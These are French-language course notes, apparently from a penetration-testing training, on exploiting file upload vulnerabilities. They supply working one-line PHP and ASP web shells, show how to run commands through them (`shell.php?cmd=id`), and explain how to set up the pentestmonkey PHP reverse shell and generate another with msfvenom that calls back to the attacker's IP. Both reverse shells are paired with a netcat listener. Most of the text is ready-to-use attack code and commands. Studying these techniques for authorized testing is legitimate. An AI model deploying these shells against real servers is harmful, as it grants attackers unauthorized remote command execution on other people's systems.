# File Upload Attacks

## Web Shells

Une fois la vulnérabilité confirmée, on peut uploader un **web shell** ou un **reverse shell** dans le même langage que l’application (ex: PHP).  

Exemples :  
- `phpbash.php` (terminal-like shell semi-interactif)  
- Web shells de **SecLists** (`/opt/useful/seclists/Web-Shells`)  

Après upload → cliquer sur *Download* → interaction directe avec le serveur sous l’utilisateur `www-data`.

### Custom Web Shell

On doit savoir écrire un web shell simple au cas où aucun n’est disponible en ligne.  

Exemple PHP :  
`<?php system($_REQUEST['cmd']); ?>`

Uploader `shell.php`, puis exécuter avec :  
`http://SERVER/shell.php?cmd=id`  
→ Retourne `uid=33(www-data) gid=33(www-data)`.

Astuce : afficher en *source view* (`CTRL+U`) dans le navigateur pour voir le rendu brut.

Exemple ASP.NET :  
`<% eval request('cmd') %>`

⚠️ Certains serveurs désactivent les fonctions utilisées (`system()` par ex.) ou bloquent via un WAF → nécessitent des techniques avancées

## Reverse Shell

Un reverse shell permet une connexion sortante depuis le serveur vulnérable vers notre machine.  
Exemple fiable : **pentestmonkey PHP reverse shell** (aussi dispo dans SecLists).  

Modifier dans le script :  
`$ip = 'OUR_IP';`  
`$port = OUR_PORT;`

### Étapes :
1. Lancer un listener :  
   `nc -lvnp OUR_PORT`
2. Uploader le reverse shell modifié.  
3. Visiter son URL.  
4. Résultat :  
   `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## Générer un Reverse Shell avec msfvenom

On peut générer un reverse shell custom dans plusieurs langages.  
Exemple PHP :  

`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

Puis :  
`nc -lvnp OUR_PORT`  
→ Connexion reçue depuis le serveur vulnérable.

## Ressources

- PHPBash : [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)  
- SecLists Web Shells : [https://github.com/danielmiessler/SecLists/tree/master/Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  
- Pentestmonkey PHP Reverse Shell : [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)  
